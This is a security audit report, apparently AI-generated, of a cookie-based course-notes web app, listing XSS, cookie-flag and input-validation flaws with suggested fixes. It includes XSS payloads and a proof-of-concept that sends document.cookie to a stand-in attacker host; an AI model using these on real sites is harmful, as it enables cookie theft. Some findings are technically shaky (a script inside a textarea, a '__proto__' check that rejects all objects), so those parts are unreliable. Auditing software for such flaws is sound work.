# Security Review Report: Noodle Course Notes Application

**Date:** 2025-12-05
**Application:** Noodle Course Notes Demo
**Reviewed Files:** noodle.js, test.html, README.md

---

## Executive Summary

This application allows learners to save course notes locally using browser cookies. While functional for its intended purpose, the application has **multiple critical and high-severity security vulnerabilities** that expose users to Cross-Site Scripting (XSS) attacks, data injection, and privacy risks.

**Overall Risk Level:** 🔴 **HIGH**

---

## Critical Vulnerabilities

### 1. Cross-Site Scripting (XSS) - CRITICAL ⚠️

**Location:** `noodle.js:252-253`, `noodle.js:236`, `noodle.js:242`, `noodle.js:248`

**Description:** User-controlled data is directly inserted into the DOM and Markdown exports without sanitization, allowing arbitrary JavaScript execution.

**Vulnerable Code:**
```javascript
// Line 252-253: Direct text insertion into DOM
var text = sectionData.text ? sectionData.text : "_(no notes yet)_";
lines.push(text);

// Line 236: Unsanitized course name in heading
var lines = ["# " + effectiveCourseName, ""];

// Line 242: Unsanitized section titles
var heading = "## " + (sectionData.title || sectionData.id || ("Section " + (m + 1)));

// Line 248: Unsanitized timestamp
lines.push("_Last saved: " + formatted + "_");
```

**Attack Vector:**
1. User enters malicious content in textarea: `<img src=x onerror=alert('XSS')>`
2. Content is saved to cookie
3. When export button is clicked or page reloads, malicious content renders without sanitization
4. If Markdown is rendered as HTML anywhere, JavaScript executes

**Impact:**
- Cookie theft
- Session hijacking
- Credential harvesting
- Malicious redirects
- Data exfiltration

**Proof of Concept:**
```html
<form class="noodle" data-courseid="86" data-sectionid="test">
    <textarea>
        <script>
            // Steal all cookies
            fetch('https://attacker.com/steal?data=' + document.cookie);
        </script>
    </textarea>
</form>
```

**Recommendation:**
- Implement HTML entity encoding for ALL user input before DOM insertion
- Use `textContent` instead of `innerHTML` where possible
- Sanitize data before export using DOMPurify or similar library
- Implement Content Security Policy (CSP) headers

---

### 2. Cookie Security Issues - HIGH ⚠️

**Location:** `noodle.js:2-10`, `noodle.js:421`

**Description:** Cookies lack critical security attributes, making them vulnerable to various attacks.

**Vulnerable Code:**
```javascript
// Line 9: Missing security flags
document.cookie = name + "=" + value + expires + "; path=/";
```

**Issues:**
1. **No HttpOnly flag:** Cookies accessible via JavaScript (XSS exploitation)
2. **No Secure flag:** Cookies transmitted over unencrypted HTTP
3. **No SameSite attribute:** Vulnerable to CSRF attacks
4. **Path set to /:** Unnecessarily broad scope
5. **No Domain specification:** May expose data across subdomains

**Impact:**
- Cookie theft via XSS
- Man-in-the-middle attacks
- Cross-site request forgery
- Session fixation

**Recommendation:**
```javascript
document.cookie = name + "=" + value + expires +
    "; path=/noodle" +           // Restrict path
    "; Secure" +                  // HTTPS only
    "; SameSite=Strict" +        // CSRF protection
    "; Domain=" + location.hostname;  // Explicit domain
// Note: HttpOnly cannot be set via JavaScript, requires server-side
```

---

### 3. Data Injection via Attributes - HIGH ⚠️

**Location:** `noodle.js:170`, `noodle.js:187-188`

**Description:** HTML attributes are read and used without validation, allowing attackers to inject malicious data via crafted HTML.

**Vulnerable Code:**
```javascript
// Line 170: Unsanitized attribute read
var sectionTitle = form.getAttribute("data-sectiontitle") || form.getAttribute("data-sectionname");

// Line 187-188: Direct use in output
if (sectionTitle) {
    sections[sectionIdFromForm].title = sectionTitle;
}
```

**Attack Vector:**
```html
<form class="noodle"
      data-courseid="86"
      data-sectionid="test"
      data-sectiontitle="<img src=x onerror=alert('XSS')>">
    <textarea></textarea>
</form>
```

**Impact:**
- XSS via section titles
- Markdown injection
- Data corruption

**Recommendation:**
- Validate all attribute values against allowlists
- Sanitize attributes before use
- Implement strict input validation

---

## High Severity Issues

### 4. Insufficient Input Validation - HIGH

**Location:** Throughout `noodle.js`

**Description:** No validation on:
- Course IDs (`data-courseid`)
- Section IDs (`data-sectionid`)
- Textarea content length
- Course name format

**Issues:**
```javascript
// Line 368-369: No validation before use
var courseId = form.getAttribute("data-courseid");
var sectionId = form.getAttribute("data-sectionid");

// Line 407: No length limit
text: textarea.value || "",
```

**Risks:**
- Cookie overflow (cookie size limits ~4KB)
- Storage exhaustion
- Application crashes
- Malformed data injection

**Recommendation:**
```javascript
// Validate inputs
function validateCourseId(id) {
    return /^[a-zA-Z0-9_-]{1,50}$/.test(id);
}

function validateSectionId(id) {
    return /^[a-zA-Z0-9_-]{1,100}$/.test(id);
}

function validateNoteText(text) {
    const MAX_LENGTH = 2000; // Chars
    return text && text.length <= MAX_LENGTH;
}
```

---

### 5. Unsafe JSON Parsing - MEDIUM-HIGH ⚠️

**Location:** `noodle.js:340-348`

**Description:** JSON parsing lacks proper error handling and validation.

**Vulnerable Code:**
```javascript
try {
    var parsed = JSON.parse(decoded);
    if (parsed && typeof parsed === "object" && parsed.text !== undefined) {
        return parsed;
    }
} catch (e) {
    // Ignore invalid JSON; treat as legacy plain text.
}
return { text: decoded };
```

**Issues:**
- Prototype pollution possible if Object.prototype is polluted
- No validation of parsed object structure
- Fallback to plain text may expose raw data

**Recommendation:**
```javascript
function parseSavedValue(saved) {
    if (!saved) return null;

    try {
        var decoded = decodeURIComponent(saved);
        var parsed = JSON.parse(decoded);

        // Validate structure
        if (!parsed || typeof parsed !== 'object' || parsed.__proto__) {
            throw new Error('Invalid object');
        }

        // Create clean object (prototype pollution defense)
        var cleanObj = Object.create(null);
        if (typeof parsed.text === 'string') {
            cleanObj.text = parsed.text;
        }
        if (typeof parsed.courseName === 'string') {
            cleanObj.courseName = parsed.courseName;
        }
        if (typeof parsed.savedAt === 'string') {
            cleanObj.savedAt = parsed.savedAt;
        }

        return cleanObj;
    } catch (e) {
        return { text: "" };
    }
}
```

---

### 6. URI Encoding Issues - MEDIUM

**Location:** `noodle.js:30-32`, `noodle.js:332-336`, `noodle.js:412-416`

**Description:** Encoding/decoding operations may fail or expose data.

**Vulnerable Code:**
```javascript
// Line 332-336: Try-catch may hide encoding issues
try {
    decoded = decodeURIComponent(saved);
} catch (e) {
    decoded = saved;
}
```

**Issues:**
- Invalid UTF-8 sequences may crash
- Malformed percent-encoding may expose raw data
- Double-encoding vulnerabilities

**Recommendation:**
- Add strict validation for encoded strings
- Log encoding failures
- Implement maximum encoded length checks

---

## Medium Severity Issues

### 7. Privacy and Data Exposure - MEDIUM

**Description:** User notes are stored in cleartext cookies without encryption.

**Issues:**
1. **No encryption:** Anyone with cookie access can read notes
2. **Persistent storage:** 365-day expiration (line 421)
3. **Broad accessibility:** JavaScript can read all notes
4. **No integrity checking:** Data can be tampered with

**Impact:**
- Exposure of sensitive information
- Data tampering
- Privacy violations
- Potential GDPR/privacy law issues

**Recommendation:**
- Warn users not to store sensitive information
- Consider encryption (Web Crypto API)
- Add integrity checks (HMAC)
- Reduce cookie expiration period
- Consider localStorage with encryption

---

### 8. Client-Side Only Security - MEDIUM

**Description:** All security controls are client-side and easily bypassed.

**Issues:**
- No server-side validation
- Cookie manipulation possible
- No authentication/authorization
- No rate limiting
- No audit logging

**Impact:**
- Users can manipulate any data
- No accountability
- No protection against automation

**Recommendation:**
- Document that this is a client-side only tool
- Consider server-side backup option
- Add user warnings about data persistence

---

### 9. Error Information Disclosure - LOW-MEDIUM

**Location:** `noodle.js:277-289`

**Description:** Error messages via `alert()` may expose information.

**Vulnerable Code:**
```javascript
alert("No notes available to export.");
alert("Course ID not found.");
alert("Nothing to export.");
```

**Recommendation:**
- Use less revealing error messages
- Implement proper error logging
- Consider toast notifications instead of alerts

---

### 10. CSRF Vulnerability - MEDIUM

**Description:** No CSRF protection on form submissions.

**Note:** While this is a client-side only app, if forms were to submit to a server, they would be vulnerable to CSRF attacks due to:
1. No CSRF tokens
2. No SameSite cookie attribute
3. No origin validation

**Recommendation:**
- If server functionality is added, implement CSRF tokens
- Add SameSite cookie attribute

---

## Additional Security Concerns

### 11. Dependency Security - MEDIUM

**Location:** `test.html:7-8`

**Issue:** Using outdated Bootstrap 4.6.2 from CDN:
```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
```

**Concerns:**
- Bootstrap 4.6.2 has known vulnerabilities
- CDN compromise risk
- No Subresource Integrity (SRI) checks
- No version pinning guarantees

**Recommendation:**
```html
<!-- Update to Bootstrap 5.3+ with SRI -->
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      integrity="sha384-..."
      crossorigin="anonymous">
```

---

### 12. Missing Security Headers - LOW-MEDIUM

**Description:** No Content Security Policy or security headers defined.

**Recommendation:**
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' https://cdn.jsdelivr.net;
               style-src 'self' https://cdn.jsdelivr.net;
               img-src 'self' data: https:;">
```

---

### 13. Typo in Section ID - LOW

**Location:** `test.html:115`

**Issue:**
```html
<form class="noodle" data-courseid="86" data-sectionid="setion1">
```

Should be `section1` not `setion1` (line 439 has `setion2` as well).

This is a data integrity issue, not directly security-related, but could cause confusion.

---

## Attack Scenarios

### Scenario 1: Stored XSS Attack
1. Attacker shares crafted HTML with victim
2. Victim loads page with malicious form containing XSS in data-sectiontitle
3. Victim types notes and saves
4. On next page load or export, XSS executes
5. Attacker steals cookies/session data

### Scenario 2: Cookie Poisoning
1. Attacker injects malicious JavaScript via browser console
2. Manipulates `document.cookie` directly
3. Injects malicious payload into note cookies
4. When legitimate user exports notes, payload executes

### Scenario 3: Privacy Breach
1. Shared computer scenario
2. User A saves private notes
3. User B accesses same browser
4. User B opens developer tools, reads `document.cookie`
5. User B exports or reads all of User A's notes

---

## Compliance Considerations

### WCAG 2.1 / Accessibility
- ✅ Good: Uses semantic HTML forms
- ⚠️ Issue: Alert boxes not accessible to screen readers (use ARIA live regions)
- ⚠️ Issue: Export button has no ARIA label

### GDPR / Privacy Laws
- ⚠️ No privacy policy
- ⚠️ No user consent for cookie storage
- ⚠️ No data retention policy
- ⚠️ No right to erasure mechanism (clear all data)

---

## Recommendations Summary

### Immediate Actions (Critical)
1. **Implement XSS protection:**
   ```javascript
   function escapeHtml(unsafe) {
       return unsafe
           .replace(/&/g, "&amp;")
           .replace(/</g, "&lt;")
           .replace(/>/g, "&gt;")
           .replace(/"/g, "&quot;")
           .replace(/'/g, "&#039;");
   }
   ```

2. **Add cookie security flags:**
   ```javascript
   "; Secure; SameSite=Strict"
   ```

3. **Validate all inputs:**
   - Course IDs: alphanumeric + hyphen/underscore only
   - Section IDs: same as above
   - Note text: length limits (2000 chars max)

### Short-term Actions (High Priority)
1. Update Bootstrap to 5.3+ with SRI
2. Add Content Security Policy
3. Implement input sanitization library (DOMPurify)
4. Add maximum note length validation
5. Add data integrity checks

### Long-term Actions (Medium Priority)
1. Consider encryption for stored data
2. Add user warnings about data persistence
3. Implement "Clear All Data" functionality
4. Add privacy policy
5. Consider server-side storage option with authentication
6. Add audit logging if server-side component added

### Code Quality
1. Fix typos in section IDs (setion1 → section1)
2. Add JSDoc comments
3. Implement error logging
4. Add automated security testing
5. Run static analysis tools (ESLint with security plugins)

---

## Security Testing Performed

### Manual Testing
- ✅ Reviewed all JavaScript for injection vulnerabilities
- ✅ Analyzed cookie implementation
- ✅ Examined data flow from input to storage to output
- ✅ Checked for HTML/JS injection points
- ✅ Reviewed error handling

### Tools Recommended for Future Testing
- OWASP ZAP (web security scanner)
- ESLint with security plugins (eslint-plugin-security)
- npm audit (dependency vulnerabilities)
- DOMPurify (XSS sanitization)
- Snyk (dependency scanning)

---

## Risk Matrix

| Vulnerability | Severity | Likelihood | Impact | Priority |
|--------------|----------|------------|--------|----------|
| XSS (stored) | Critical | High | High | **P0** |
| Cookie Security | High | High | Medium | **P0** |
| Data Injection | High | Medium | High | **P1** |
| Input Validation | High | High | Medium | **P1** |
| Unsafe JSON Parse | Medium | Low | Medium | P2 |
| Privacy Exposure | Medium | High | Medium | P2 |
| Outdated Dependencies | Medium | Medium | Low | P2 |
| CSRF | Medium | Low | Medium | P3 |

---

## Conclusion

The Noodle Course Notes application provides useful functionality but requires **immediate security improvements** before production use. The most critical issues are:

1. **XSS vulnerabilities** throughout the application
2. **Insecure cookie implementation** lacking security flags
3. **Insufficient input validation and sanitization**

These vulnerabilities could lead to:
- Data theft
- Session hijacking
- Privacy breaches
- Cross-site scripting attacks

**Recommendation:** Do not deploy this application in a production environment until critical vulnerabilities are addressed. Consider this a proof-of-concept that requires security hardening.

---

## Contact

For questions about this security review, please contact the development team.

**Report Generated:** 2025-12-05
**Reviewed By:** Claude Code Security Review
**Files Reviewed:** noodle.js (439 lines), test.html, README.md
